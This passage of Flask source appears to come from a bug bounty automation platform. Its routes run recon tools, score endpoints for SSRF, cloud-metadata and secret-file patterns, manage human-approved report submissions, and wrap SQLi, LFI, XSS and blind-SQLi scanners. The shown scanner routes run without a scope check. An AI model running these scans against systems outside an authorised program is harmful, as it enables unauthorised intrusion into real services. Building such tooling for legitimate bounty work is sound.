            str(score): sum(1 for _, sc in scored if sc == score)
            for score in sorted({sc for _, sc in scored}, reverse=True)
        },
        "budgets": {
            "subfinder_s": 120, "amass_s": 180, "assetfinder_s": 90,
            "findomain_s": 90,  "chaos_s": 60,  "dnsx_s": 180,
            "httpx_s": 180,     "subs_total_s": 600,
        },
    })


@app.route("/recon/stage_status")
def recon_stage_status():
    """
    Per-stage lifecycle status for a domain.
    GET /recon/stage_status?domain=example.com

    Returns status, age_seconds, meta, and stuck detection.
    Watchdog auto-fixes stuck stages by marking them timeout.
    """
    import sqlite3 as _sl, time as _tm
    d = _domain(request.args.get("domain",""))
    if not d:
        return jsonify({"error": "domain required"}), 400

    now = _tm.time()
    STAGE_LABELS = {
        "fingerprint": "HTTP fingerprinting",
        "screenshots": "Gowitness screenshots",
        "js_deep":     "JS deep analysis (LinkFinder/secrets)",
        "js_collect":  "JS file collection (subjs)",
        "oob_setup":   "OOB/interactsh setup",
        "oob":         "OOB host (scanner)",
        "auth_scan":   "Nuclei auth scan",
        "subdomains":  "Subdomain enumeration",
        "active":      "Live host probing (httpx)",
        "endpoints":   "URL/endpoint collection",
        "crawl":       "Web crawler (katana/gospider)",
        "dirbust":     "Directory bruteforce (ffuf/gobuster)",
        "ports":       "Port scanning (naabu)",
        "params":      "Parameter discovery (arjun)",
        "test":        "Pre-Scan setup",
    }
    # Max seconds in 'run' before considered stuck
    BUDGETS = {
        "js_collect": 180, "js_deep": 180,
        "oob_setup":  15,  "oob":     15,
        "auth_scan":  240, "test":    60,
        "screenshots":180, "fingerprint": 120,
        "crawl":  3600, "dirbust":  3600,
        "subdomains": 900, "active": 600,
    }
    TERMINAL = {"done","skip","timeout","error","skipped"}

    try:
        conn = _sl.connect(db.db_path)
        conn.row_factory = _sl.Row
        did = conn.execute("SELECT id FROM domains WHERE domain=?", (d,)).fetchone()
        if not did:
            conn.close()
            return jsonify({"domain":d,"stages":{},"any_stuck":False,
                            "pipeline_done":False,"note":"domain not found"})
        rows = conn.execute(
            "SELECT step,state,meta,updated_at FROM recon_steps WHERE domain_id=?",
            (did["id"],)).fetchall()
        conn.close()

        ep_cnt  = db.count_endpoints(d)
        sub_cnt = len(db.get_subs(d) or [])
        h_cnt   = len((db.get_hosts(d) or {}).get("active",[]))

        stages = {}
        auto_fixed = []
        for r in rows:
            name, state, meta = r["step"], r["state"], (r["meta"] or "")
            ts   = r["updated_at"] or 0
            try:
                # Handle both Unix timestamp (int/float) and SQLite datetime string
                ts_float = float(ts)
                if ts_float < 1e9:
                    # Looks like a relative or invalid value — treat as unknown
                    age = None
                else:
                    age = round(now - ts_float, 1)
            except (ValueError, TypeError):
                # SQLite datetime string format: "2026-05-05 05:04:00"
                try:
                    import datetime as _dt
                    dt = _dt.datetime.strptime(str(ts)[:19], "%Y-%m-%d %H:%M:%S")
                    age = round(now - dt.replace(tzinfo=_dt.timezone.utc).timestamp(), 1)
                except Exception:
                    age = None
            budget   = BUDGETS.get(name)
            is_stuck = (state == "run" and budget and age and age > budget)
            terminal = state in TERMINAL
            if is_stuck:
                try:
                    db.set_step(d, name, "timeout",
                                f"watchdog: stuck >{budget}s (age={age}s)")
                    state = "timeout"; terminal = True; is_stuck = False
                    auto_fixed.append(name)
                    log.warning(f"[watchdog] stage={name} timeout age={age}s → marked timeout")
                except Exception: pass
            stages[name] = {
                "status": state, "done": terminal, "meta": meta,
                "updated_at": ts, "age_seconds": age,
                "label": STAGE_LABELS.get(name, name), "stuck": is_stuck,
                "count": (ep_cnt if name in ("endpoints","crawl","dirbust")
                          else sub_cnt if name=="subdomains"
                          else h_cnt if name in ("active","fingerprint","screenshots","auth_scan")
                          else 0),
            }
        for sn in STAGE_LABELS:
            if sn not in stages:
                stages[sn] = {"status":"pending","done":False,"meta":"",
                               "updated_at":None,"age_seconds":None,
                               "label":STAGE_LABELS[sn],"stuck":False,"count":0}

        tracked   = ["js_collect","js_deep","oob","oob_setup","auth_scan","test"]
        all_done  = all(stages.get(s,{}).get("done") for s in tracked)
        any_stuck = any(stages.get(s,{}).get("stuck") for s in stages)
        if all_done:
            log.info(f"[pipeline] finalized domain={d} any_stuck=false")

        return jsonify({"domain":d,"stages":stages,"pipeline_done":all_done,
                        "any_stuck":any_stuck,"auto_fixed":auto_fixed,
                        "counts":{"endpoints":ep_cnt,"subdomains":sub_cnt,"live_hosts":h_cnt}})
    except Exception as e:
        log.warning(f"/recon/stage_status: {e}")
        return jsonify({"error":str(e)}), 500



@app.route("/recon/debug_tools")
def recon_debug_tools():
    """
    Run each recon tool in isolation and verify endpoint ingestion.
    GET /recon/debug_tools?domain=testasp.vulnweb.com

    Returns per-tool: binary path, command, stdout_lines, parsed_urls, duration_ms
    Also: db_insert_test, domain key used, count before/after

    [endpoint] requested_domain=... storage_domain=... source=gau
    """
    import subprocess, shutil, time as _time
    from pathlib import Path as _P
    d = _domain(request.args.get("domain", ""))
    if not d:
        return jsonify({"error": "domain required"}), 400

    # Resolve tool binaries (same lookup recon.py uses)
    from recon import _tools
    try:
        T = _tools()
    except Exception:
        T = {}
        for name in ["gau","katana","waybackurls","httpx","waymore"]:
            found = shutil.which(name)
            if found:
                T[name] = found

    results    = []
    clean_host = d.replace("https://","").replace("http://","").split("/")[0]

    # ── DB insert baseline ────────────────────────────────────────────────────
    # Clear in-process dedup for this domain so insert test is honest
    if hasattr(db, '_seen_ends') and d in db._seen_ends:
        del db._seen_ends[d]
    before_count = db.count_endpoints(d)
    test_url     = f"https://{d}/__recon_debug_test?ts={int(time.time())}"
    insert_ok    = db.add_endpoint(d, test_url, source="debug_test")
    after_count  = db.count_endpoints(d)

    # ── Tool probes (30s each, no real scan) ─────────────────────────────────
    def _probe(tool_name: str, cmd: list) -> dict:
        t0 = _time.monotonic()
        result = {
            "tool":          tool_name,
            "binary":        cmd[0] if cmd else "",
            "command":       " ".join(str(x) for x in cmd),
            "input_count":   1,
            "stdout_lines":  [],
            "stderr_lines":  [],
            "exit_code":     -1,
            "duration_ms":   0,
            "parsed_urls":   0,
        }
        if not cmd or not shutil.which(cmd[0]):
            result["exit_code"] = -2
            result["stderr_lines"] = [f"{tool_name} not in PATH"]
            return result
        try:
            proc = subprocess.run(
                cmd, capture_output=True, text=True, timeout=25
            )
            elapsed = int((_time.monotonic() - t0) * 1000)
            lines = [l.strip() for l in proc.stdout.splitlines() if l.strip()]
            urls  = [l for l in lines if l.startswith("http")]
            result.update({
                "exit_code":    proc.returncode,
                "duration_ms":  elapsed,
                "stdout_lines": urls[:20],        # cap display at 20
                "stderr_lines": proc.stderr.splitlines()[:5],
                "parsed_urls":  len(urls),
            })
        except subprocess.TimeoutExpired:
            result["stderr_lines"] = [f"timed out after 25s"]
            result["duration_ms"]  = 25000
        except Exception as e:
            result["stderr_lines"] = [str(e)]
        return result

    # gau
    if T.get("gau"):
        r = _probe("gau", [T["gau"], clean_host, "--threads", "5"])
        # Insert discovered URLs into DB
        saved = 0
        for u in r["stdout_lines"]:
            if db.add_endpoint(d, u, source="gau_debug"):
                saved += 1
        r["saved_to_db"] = saved
        log.info(f"[endpoint] source=gau parsed={r['parsed_urls']} saved={saved}")
        results.append(r)

    # waybackurls
    if T.get("waybackurls"):
        r = _probe("waybackurls", [T["waybackurls"], d])
        saved = 0
        for u in r["stdout_lines"]:
            if db.add_endpoint(d, u, source="waybackurls_debug"):
                saved += 1
        r["saved_to_db"] = saved
        log.info(f"[endpoint] source=waybackurls parsed={r['parsed_urls']} saved={saved}")
        results.append(r)

    # katana (passive, no crawl)
    if T.get("katana"):
        r = _probe("katana", [T["katana"], "-u", f"https://{d}",
                               "-d", "1", "-silent", "-timeout", "10"])
        saved = 0
        for u in r["stdout_lines"]:
            if db.add_endpoint(d, u, source="katana_debug"):
                saved += 1
        r["saved_to_db"] = saved
        log.info(f"[endpoint] source=katana parsed={r['parsed_urls']} saved={saved}")
        results.append(r)

    # httpx probe (ProjectDiscovery httpx uses positional URL, not -u)
    if T.get("httpx"):
        r = _probe("httpx", [T["httpx"], f"https://{d}", "-silent",
                               "-timeout", "10", "-status-code"])
        results.append(r)

    final_count = db.count_endpoints(d)
    # Write export files from whatever is now in DB
    from pathlib import Path as _FP
    ep_list = db.get_endpoints(d, limit=50000) or []
    _exp_dir = _FP(__file__).parent / "data" / "exports" / d
    _exp_dir.mkdir(parents=True, exist_ok=True)
    (_exp_dir / f"{d}_crawled.txt").write_text("\n".join(ep_list))
    params_eps = [u for u in ep_list if "?" in u]
    (_exp_dir / f"{d}_params.txt").write_text("\n".join(params_eps))
    api_eps = [u for u in ep_list if "/api/" in u or "/v1/" in u or "/v2/" in u]
    (_exp_dir / f"{d}_api.txt").write_text("\n".join(api_eps))
    log.info(f"[export] writing domain={d} urls={len(ep_list)} out_dir={_exp_dir} (debug_tools)")
    log.info(f"[export] wrote crawled={len(ep_list)} params={len(params_eps)} api={len(api_eps)}")

    return jsonify({
        "requested_domain":    d,
        "storage_domain":      d,
        "root_domain":         ".".join(d.split(".")[-2:]) if d.count(".") >= 1 else d,
        "tools_found":         {k: v for k, v in T.items()
                                if k in ("gau","waybackurls","katana","httpx","waymore")},
        "db_insert_test":      insert_ok,
        "db_count_before":     before_count,
        "db_count_after":      after_count,
        "db_count_final":      final_count,
        "export_files_written": {
            "crawled": len(ep_list),
            "params":  len(params_eps),
            "api":     len(api_eps),
        },
        "tool_results":        results,
    })


@app.route("/nuclei/scan_debug")
def nuclei_scan_debug():
    """
    Domain-specific nuclei pre-scan diagnostic.
    Returns endpoint scoring breakdown and target selection for a given domain.

    GET /nuclei/scan_debug?domain=example.com
    """
    from engine.nuclei_engine import get_binary, get_status, get_template_dirs
    import re as _re

    d = _domain(request.args.get("domain",""))
    if not d:
        return jsonify({"error": "domain required"}), 400

    binary = get_binary()
    status = get_status()
    tpl_dirs = get_template_dirs()

    # Replicate scoring logic from scanner.py _score_bounty
    def _score_bounty(url):
        s = 0; u = url.lower()
        if _re.search(r'[?&](url|uri|dest|destination|redirect|callback|'
                      r'webhook|src|fetch|proxy|host|endpoint|target|'
                      r'return|next|path|continue)=', url, re.I): s += 250
        if any(p in u for p in ['169.254','metadata','cloud','aws','gcp',
                                  'azure','internal','localhost']): s += 250
        if any(p in u for p in ['/admin','/administrator','/manager',
                                  '/dashboard','/panel','/cp/',
                                  '/login','/signin','/auth',
                                  '/payment','/billing','/checkout',
                                  '/account','/profile']): s += 220
        if any(p in u for p in ['/api/','/v1/','/v2/','/v3/','/v4/',
                                  '/rest/','/graphql','/query']) and '?' in url: s += 200
        if any(p in u for p in ['/upload','/import','/export','/download',
                                  '/file','/attachment','file=','filename=']): s += 180
        if any(p in u for p in ['/oauth','/saml','/sso','/oidc',
                                  '/callback','/token','/authorize']): s += 160
        if any(p in u for p in ['.env','.git','.htaccess','config',
                                  'backup','.bak','.log','.sql','secret']): s += 150
        if any(p in u for p in ['/graphql','/swagger','/openapi',
                                  '/api-docs','/redoc','/graphiql']): s += 100
        if '?' in url: s += 60
        return s

    _STATIC_EXTS = re.compile(
        r'/[^?#]*\.(png|jpg|jpeg|gif|svg|ico|webp|woff|woff2|ttf|eot|otf'
        r'|css|map|pdf|zip|tar|gz|mp4|mp3|avi|mov)(\?|#|$)', re.I
    )
    _CDN_PATTERNS = re.compile(
        r'(cdn\.|cloudfront\.net|akamaihd\.net|fastly\.net'
        r'|googleapis\.com|gstatic\.com|bootstrapcdn\.com'
        r'|jquery\.com|unpkg\.com|cdnjs\.cloudflare\.com)', re.I
    )

    # Get endpoints from DB
    eps     = db.get_endpoints(d, limit=20000)
    ep_strs = [e if isinstance(e,str) else e.get("url","") for e in eps]
    live_h  = db.get_hosts(d)
    live_urls = [h for h in (live_h.get("active",[]) or live_h.get("live",[]) or [])
                 if h.startswith(("http://","https://"))]

    # Score endpoints
    scored = []
    seen_norm: set = set()
    for url in ep_strs:
        if not url.startswith(("http://","https://")): continue
        if _STATIC_EXTS.search(url): continue
        if _CDN_PATTERNS.search(url): continue
        norm = url.split("?")[0]
        if norm in seen_norm: continue
        seen_norm.add(norm)
        s = _score_bounty(url)
        if s > 0:
            scored.append({"url": url[:100], "score": s})

    scored.sort(key=lambda x: -x["score"])

    # Apply selection rules
    all_candidates = list(dict.fromkeys(
        live_urls + [e["url"] for e in scored]
    ))
    if len(all_candidates) >= 100:
        cutoff = max(50, int(len(all_candidates) * 0.30))
        high_value = all_candidates[:cutoff]
        rule = f"top30% of {len(all_candidates)} = {cutoff}"
    else:
        high_value = all_candidates
        rule = f"all<100 ({len(all_candidates)})"

    # Bounty-focused default tags
    selected_tags = sorted([
        "exposure","misconfiguration","default-login","takeover",
        "ssrf","lfi","rce","auth-bypass","cloud","api",
        "graphql","swagger","token","secrets","panel","cve","redirect",
    ])

    # Tech tags from DB
    try:
        tech_raw = db.get_tech(d) or []
        tech_tags = []
        _TECH_MAP = {
            "wordpress":["wordpress","cves","exposure","default-login"],
            "apache":["apache","misconfiguration","cves"],
            "nginx":["nginx","misconfiguration"],
            "iis":["iis","asp","microsoft","cves"],
            "spring":["spring","springboot","actuator","cves"],
            "node":["nodejs","express","api"],
            "aws":["cloud","metadata","exposure"],
            "graphql":["graphql"],
            "swagger":["swagger","api"],
        }
        for t in tech_raw:
            for k, tags in _TECH_MAP.items():
                if k in t.lower():
                    tech_tags.extend(tags)
        selected_tags = sorted(set(selected_tags + tech_tags))
    except Exception:
        tech_raw = []

    return jsonify({
        "domain":             d,
        "binary_found":       bool(binary),
        "binary_path":        binary or "",
        "templates_count":    status.get("templates", 0),
        "template_dirs":      tpl_dirs,
        "endpoints_from_db":  len(ep_strs),
        "live_targets":       len(live_urls),
        "high_value_targets": len(high_value),
        "selection_rule":     rule,
        "top_scored":         scored[:10],
        "selected_tags":      selected_tags,
        "tech_detected":      tech_raw[:10],
        "sample_targets":     high_value[:10],
        "nuclei_status": {
            "installed":  bool(binary),
            "version":    status.get("version",""),
            "templates":  status.get("templates", 0),
        },
        "would_skip": len(high_value) == 0,
        "skip_reason": "no_high_value_targets" if len(high_value) == 0 else None,
    })


@app.route("/nuclei/selftest", methods=["POST", "GET"])
def nuclei_selftest():
    """
    Run nuclei against https://httpbin.org/get?test=1 to verify the pipeline works end-to-end.
    Returns: binary present, targets_loaded, raw_results, pipeline_ok.
    """
    from engine.nuclei_engine import scan as nuclei_scan, get_binary, get_status
    status = get_status()
    binary = get_binary()

    result = {
        "binary_found":   bool(binary),
        "binary_path":    binary or "",
        "templates":      status.get("templates", 0),
        "targets_loaded": 0,
        "raw_results":    0,
        "pipeline_ok":    False,
        "findings":       [],
        "diagnosis":      [],
    }

    if not binary:
        result["diagnosis"].append(
            "nuclei binary not found — POST /nuclei/install to auto-install"
        )
        return jsonify(result)

    # Run against a known-safe public target
    _selftest_url = "https://httpbin.org/get?test=1&debug=true&url=http://example.com"
    result["targets_loaded"] = 1

    findings = nuclei_scan(
        targets=[_selftest_url],
        severity=["critical","high","medium","low","info"],
        include_cves=False,
        max_time=60,
        high_signal_only=False,
        tags=["exposure","misconfiguration","info","header"],
    )

    result["raw_results"]  = len(findings)
    result["findings"]     = findings[:5]
    result["pipeline_ok"]  = True   # binary ran without exception

    if not findings:
        result["diagnosis"].append(
            "nuclei ran successfully but returned 0 findings against httpbin.org — "
            "this is expected if no templates match; binary and parsing are functional"
        )
        result["diagnosis"].append(
            "Try scanning a real target with /nuclei/quick_scan to verify against live apps"
        )
    else:
        result["diagnosis"].append(
            f"pipeline confirmed: {len(findings)} findings from selftest target"
        )

    log.info(
        f"[nuclei:selftest] binary={bool(binary)}"
        f" raw_results={result['raw_results']}"
        f" pipeline_ok={result['pipeline_ok']}"
    )
    return jsonify(result)


@app.route("/nuclei/explain")
def nuclei_explain():
    """
    Explain why nuclei returned 0 findings for a domain.
    Analyzes: targets, endpoint quality, template availability.
    """
    d = _domain(request.args.get("domain",""))
    if not d: return jsonify({"error":"domain required"}), 400

    from engine.nuclei_engine import get_binary, get_status, get_template_dirs

    eps    = db.get_endpoints(d, limit=5000)
    ep_str = [e if isinstance(e,str) else e.get("url","") for e in eps]
    live   = db.get_hosts(d)
    binary = get_binary()
    status = get_status()
    tpldirs = get_template_dirs()

    param_eps  = [e for e in ep_str if "?" in e]
    api_eps    = [e for e in ep_str if any(p in e for p in ["/api/","/v1/","/v2/","/graphql","/admin","/login"])]
    static_eps = [e for e in ep_str if re.search(r'\.(js|css|png|jpg|woff|svg)(\?|$)', e, re.I)]

    reasons  = []
    suggests = []

    if not binary:
        reasons.append("nuclei binary not installed")
        suggests.append("POST /nuclei/install to auto-install")
    if not tpldirs:
        reasons.append("no template directories found")
        suggests.append("POST /nuclei/install to download templates")
    if not ep_str:
        reasons.append("0 endpoints in DB — recon has not run yet or found nothing")
        suggests.append("Run full recon first to collect endpoints")
    elif not param_eps and not api_eps:
        reasons.append(
            f"0 parameterized or API endpoints out of {len(ep_str)} total"
            f" ({len(static_eps)} static assets)"
        )
        suggests.append(
            "90% of endpoints appear static — add gau/waybackurls to collect "
            "parameterized URLs from historical data"
        )
    elif len(param_eps) < 5:
        reasons.append(
            f"only {len(param_eps)} parameterized endpoints — templates need query "
            f"params to fuzz"
        )
        suggests.append("Use katana or paramspider to discover more parameterized URLs")

    if not reasons:
        reasons.append(
            f"pipeline appears healthy: {len(param_eps)} param, {len(api_eps)} API endpoints"
        )
        suggests.append(
            "Templates may simply not match the target's tech stack — "
            "try adding more specific bug types to your scan"
        )

    return jsonify({
        "domain":           d,
        "binary_found":     bool(binary),
        "templates":        status.get("templates", 0),
        "template_dirs":    tpldirs,
        "total_endpoints":  len(ep_str),
        "parameterized":    len(param_eps),
        "api_endpoints":    len(api_eps),
        "static_endpoints": len(static_eps),
        "live_hosts":       live.get("active_count", 0),
        "reasons":          reasons,
        "suggestions":      suggests,
        "example_params":   param_eps[:5],
        "example_api":      api_eps[:5],
    })


# ══════════════════════════════════════════════════════════════════════════════
# BUG BOUNTY OPERATOR SYSTEM ROUTES
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/programs/import", methods=["POST"])
def programs_import():
    """Import a bug bounty program (scope, allowed bugs, platform, guidelines)."""
    p = request.get_json(silent=True, force=True) or {}
    if not p.get("name"):
        return jsonify({"error": "name required"}), 400
    try:
        from engine.program_intel import import_program
        pid = import_program(p)
        return jsonify({"ok": True, "program_id": pid, "name": p.get("name")})
    except Exception as e:
        log.error(f"[programs] import: {e}")
        return jsonify({"error": str(e)}), 500

@app.route("/programs/list")
def programs_list():
    """List all imported programs."""
    from engine.program_intel import list_programs
    return jsonify({"programs": list_programs()})

@app.route("/programs/<program_id>")
def programs_get(program_id):
    """Get full program details including scope rules."""
    from engine.program_intel import get_program
    p = get_program(program_id)
    if not p: return jsonify({"error": "not found"}), 404
    return jsonify(p)

@app.route("/programs/scope_check")
def programs_scope_check():
    """Check if a domain is in scope for a program."""
    domain     = request.args.get("domain","")
    program_id = request.args.get("program_id","")
    if not domain or not program_id:
        return jsonify({"error": "domain and program_id required"}), 400
    from engine.program_intel import is_in_scope, allowed_test
    return jsonify({
        "domain":     domain,
        "program_id": program_id,
        "in_scope":   is_in_scope(domain, program_id),
    })


@app.route("/submission/draft", methods=["POST"])
def submission_draft():
    """
    Create a submission draft from a confirmed finding.
    Enforces: scope check, allowed_bugs, confidence threshold, dedup.
    """
    p          = request.get_json(silent=True, force=True) or {}
    finding    = p.get("finding", {})
    program_id = p.get("program_id", "")
    if not finding or not program_id:
        return jsonify({"error": "finding and program_id required"}), 400
    try:
        from engine.submission_engine import create_draft
        draft_id = create_draft(finding, program_id, p.get("notes",""))
        log.info(f"[submission] draft created id={draft_id}")
        return jsonify({"ok": True, "draft_id": draft_id})
    except ValueError as e:
        return jsonify({"error": str(e), "blocked": True}), 422
    except Exception as e:
        log.error(f"[submission] draft: {e}")
        return jsonify({"error": str(e)}), 500

@app.route("/submission/list")
def submission_list():
    """List drafts, optionally filtered by program_id or state."""
    program_id = request.args.get("program_id","")
    state      = request.args.get("state","")
    from engine.submission_engine import list_drafts
    return jsonify({"drafts": list_drafts(program_id, state)})

@app.route("/submission/approve", methods=["POST"])
def submission_approve():
    """
    Approve a draft for submission. Reviewer identity required.
    HUMAN-GATED: this is the only gate before submit.
    """
    p        = request.get_json(silent=True, force=True) or {}
    draft_id = p.get("draft_id","")
    reviewer = p.get("reviewer","")
    if not draft_id or not reviewer:
        return jsonify({"error": "draft_id and reviewer required"}), 400
    try:
        from engine.submission_engine import approve_draft
        draft = approve_draft(draft_id, reviewer)
        log.info(f"[submission] approved by {reviewer} id={draft_id}")
        return jsonify({"ok": True, "draft": draft})
    except ValueError as e:
        return jsonify({"error": str(e)}), 422
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/submission/submit", methods=["POST"])
def submission_submit():
    """
    Submit an APPROVED draft to the platform.
    Fails if not in APPROVED state.
    """
    p        = request.get_json(silent=True, force=True) or {}
    draft_id = p.get("draft_id","")
    if not draft_id:
        return jsonify({"error": "draft_id required"}), 400
    try:
        from engine.submission_engine import submit
        result = submit(draft_id)
        # Record in payout tracker
        try:
            from engine.payout_tracker import record_submission
            from engine.submission_engine import get_draft
            d = get_draft(draft_id) or {}
            record_submission(
                report_id     = draft_id,
                submission_id = result.get("submission_id",""),
                program_id    = d.get("program_id",""),
                title         = d.get("title",""),
                bug_type      = d.get("bug_type",""),
                severity      = d.get("severity",""),
            )
        except Exception as _pe:
            log.debug(f"[submission] payout record: {_pe}")
        log.info(f"[submission] submitted to {result.get('platform')} id={result.get('submission_id','(copy-paste)')}")
        return jsonify(result)
    except ValueError as e:
        return jsonify({"error": str(e), "blocked": True}), 422
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/submission/status", methods=["POST"])
def submission_status():
    """Update submission status (triage, resolve, duplicate, etc.)."""
    p        = request.get_json(silent=True, force=True) or {}
    draft_id = p.get("draft_id","") or p.get("report_id","")
    status   = p.get("status","")
    bounty   = float(p.get("bounty", 0.0))
    if not draft_id: return jsonify({"error": "draft_id required"}), 400
    try:
        from engine.submission_engine import sync_status
        result = sync_status(draft_id, status, bounty)
        return jsonify({"ok": True, "draft": result})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/submission/optimize", methods=["POST"])
def submission_optimize():
    """Score a report draft and return WIN SCORE with actionable suggestions."""
    p = request.get_json(silent=True, force=True) or {}
    report   = p.get("report", {})
    draft_id = p.get("draft_id","")
    if not report and draft_id:
        from engine.submission_engine import get_draft
        import json as _j
        d = get_draft(draft_id)
        if d: report = _j.loads(d.get("report_json","{}"))
    if not report: return jsonify({"error": "report or draft_id required"}), 400
    from engine.win_optimizer import score_report
    return jsonify(score_report(report))


@app.route("/payouts/stats")
def payouts_stats():
    """Dashboard: total earnings, win rate, avg payout, time metrics."""
    program_id = request.args.get("program_id","")
    from engine.payout_tracker import metrics
    return jsonify(metrics(program_id))

@app.route("/payouts/list")
def payouts_list():
    """List payout records."""
    from engine.payout_tracker import list_records
    return jsonify({"records": list_records(
        request.args.get("program_id",""),
        request.args.get("status",""),
        int(request.args.get("limit","100"))
    )})

@app.route("/payouts/update", methods=["POST"])
def payouts_update():
    """Manually update a payout record status/bounty."""
    p = request.get_json(silent=True, force=True) or {}
    report_id = p.get("report_id","")
    if not report_id: return jsonify({"error":"report_id required"}), 400
    try:
        from engine.payout_tracker import update_status
        result = update_status(
            report_id = report_id,
            status    = p.get("status","triaged"),
            bounty    = float(p.get("bounty",0.0)),
            currency  = p.get("currency","USD"),
            notes     = p.get("notes",""),
        )
        log.info(f"[payout] updated: {result}")
        return jsonify({"ok": True, "record": result})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ══════════════════════════════════════════════════════════════════════════════
# EXTERNAL TOOLS ROUTES
# Integrates: scripts-main, GFpattren-main, payloads-main, lostfuzzer-main,
#             loxs-main, customBsqli-main, crtmon-main, swagger-main,
#             wayback-url-finder-main
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/ext/status")
def ext_status():
    """Return availability of every external tool package."""
    from engine.external_tools import get_status
    return jsonify(get_status())


@app.route("/ext/gf/classify")
def ext_gf_classify():
    """Classify a URL or list of URLs using GF patterns."""
    from engine.external_tools import gf_classify_url, gf_split_by_vuln
    d = _domain(request.args.get("domain", ""))
    url = request.args.get("url", "")
    if url:
        return jsonify({"url": url, "bugs": gf_classify_url(url)})
    if d:
        eps = db.get_endpoints(d, limit=5000)
        urls = [e if isinstance(e,str) else e.get("url","") for e in eps]
        buckets = gf_split_by_vuln(urls)
        return jsonify({
            "domain": d,
            "total":  len(urls),
            "buckets": {k: len(v) for k,v in buckets.items()},
            "samples": {k: v[:5] for k,v in buckets.items()},
        })
    return jsonify({"error": "url or domain required"}), 400


@app.route("/ext/gf/filter")
def ext_gf_filter():
    """Filter domain endpoints using a specific GF pattern."""
    from engine.external_tools import gf_filter_urls
    d      = _domain(request.args.get("domain",""))
    pattern = request.args.get("pattern","sqli")
    limit  = int(request.args.get("limit","500"))
    if not d: return jsonify({"error":"domain required"}), 400
    eps  = db.get_endpoints(d, limit=10000)
    urls = [e if isinstance(e,str) else e.get("url","") for e in eps]
    filtered = gf_filter_urls(urls, pattern)
    return jsonify({
        "domain":  d, "pattern": pattern,
        "total":   len(urls), "matched": len(filtered),
        "urls":    filtered[:limit],
    })


@app.route("/ext/wayback")
def ext_wayback():
    """Fetch archived URLs from Wayback Machine CDX API."""
    from engine.external_tools import wayback_cdx, scripts_wayback
    d    = _domain(request.args.get("domain",""))
    mode = request.args.get("mode","wildcard")  # wildcard|domain|specific|extensions
    if not d: return jsonify({"error":"domain required"}), 400
    urls = wayback_cdx(d, mode=mode, timeout=60)
    # Also store discovered parameterized endpoints
    stored = 0
    for url in urls:
        if "?" in url and url.startswith("http"):
            if db.add_endpoint(d, url, source="wayback"):
                stored += 1
    return jsonify({"domain":d,"mode":mode,"total":len(urls),"stored":stored,"urls":urls[:200]})


@app.route("/ext/alienvault")
def ext_alienvault():
    """Fetch URLs from AlienVault OTX."""
    from engine.external_tools import scripts_alienvault
    d = _domain(request.args.get("domain",""))
    if not d: return jsonify({"error":"domain required"}), 400
    urls = scripts_alienvault(d, timeout=60)
    stored = 0
    for url in urls:
        if "?" in url and url.startswith("http"):
            if db.add_endpoint(d, url, source="alienvault"):
                stored += 1
    return jsonify({"domain":d,"total":len(urls),"stored":stored,"urls":urls[:200]})


@app.route("/ext/urlscan")
def ext_urlscan():
    """Fetch subdomains or URLs from urlscan.io."""
    from engine.external_tools import scripts_urlscan
    d      = _domain(request.args.get("domain",""))
    mode   = request.args.get("mode","urls")
    api_key = request.args.get("api_key","") or os.environ.get("URLSCAN_API_KEY","")
    if not d: return jsonify({"error":"domain required"}), 400
    results = scripts_urlscan(d, mode=mode, api_key=api_key)
    return jsonify({"domain":d,"mode":mode,"count":len(results),"results":results[:200]})


@app.route("/ext/loxs", methods=["POST"])
def ext_loxs():
    """
    Run loxs scanner on endpoints from DB or provided URLs.
    POST {domain, scan_type, urls[], cookie, threads}
    scan_type: lfi|sqli|xss|crlf|or|bsqli
    Uses engine/loxs_wrapper.py (direct Python, no git/stdin dependency).
    """
    from engine.loxs_wrapper import scan as loxs_scan
    from engine.external_tools import gf_filter_urls
    p         = request.get_json(silent=True, force=True) or {}
    d         = _domain(p.get("domain",""))
    scan_type = p.get("scan_type","sqli")
    urls      = p.get("urls",[])
    cookie    = p.get("cookie","")
    threads   = int(p.get("threads",5))
    limit     = int(p.get("limit",50))

    if not urls and d:
        eps      = db.get_endpoints(d, limit=5000)
        all_urls = [e if isinstance(e,str) else e.get("url","") for e in eps]
        gf_map   = {"sqli":"sqli","lfi":"lfi","xss":"xss","or":"redirect",
                    "crlf":"xss","bsqli":"sqli"}
        gf_key   = gf_map.get(scan_type, scan_type)
        urls     = gf_filter_urls(all_urls, gf_key)[:limit]

    if not urls:
        return jsonify({"status":"skipped","tool":"loxs_wrapper",
                        "findings":[],"errors":["no URLs to scan — run recon first"],
                        "meta":{"scan_type":scan_type}}), 400

    result = loxs_scan(scan_type, urls, cookie=cookie, threads=threads)

    # Dedup + save findings
    saved = 0
    for f in result.get("findings",[]):
        if d and db.add_finding(d, f):
            saved += 1

    result["saved"] = saved
    log.info(f"[ext/loxs] {scan_type}: {len(result.get('findings',[]))} findings"
             f" | {saved} new | domain={d or 'provided'}")
    return jsonify(result)


@app.route("/ext/bsqli", methods=["POST"])
def ext_bsqli():
    """
    Blind SQLi scanner (timing-based).
    POST {domain, urls[], cookie, threads, payload_tag}
    Uses engine/loxs_wrapper.scan_bsqli (direct Python, no stdin dependency).
    """
    from engine.loxs_wrapper import scan_bsqli
    from engine.external_tools import gf_filter_urls, payloads_get_file
    p       = request.get_json(silent=True, force=True) or {}
    d       = _domain(p.get("domain",""))
    urls    = p.get("urls",[])
    cookie  = p.get("cookie","")
    threads = int(p.get("threads",3))
    ptag    = p.get("payload_tag","sqli_blind")

    if not urls and d:
        eps      = db.get_endpoints(d, limit=5000)
        all_urls = [e if isinstance(e,str) else e.get("url","") for e in eps]
        urls     = gf_filter_urls(all_urls, "sqli")[:30]

    if not urls:
        return jsonify({"status":"skipped","tool":"customBsqli_wrapper",
                        "findings":[],"errors":["no URLs — run recon first"],
                        "meta":{"scan_type":"bsqli"}}), 400

    payload_file = str(payloads_get_file(ptag) or "")
    result = scan_bsqli(urls, payload_file=payload_file,
                        cookie=cookie, threads=threads)

    saved = 0
    for f in result.get("findings",[]):
        if d and db.add_finding(d, f):
            saved += 1
    result["saved"] = saved
    log.info(f"[ext/bsqli] {len(result.get('findings',[]))} findings | {saved} new")
    return jsonify(result)


@app.route("/ext/lostfuzzer", methods=["POST"])
def ext_lostfuzzer():
    """
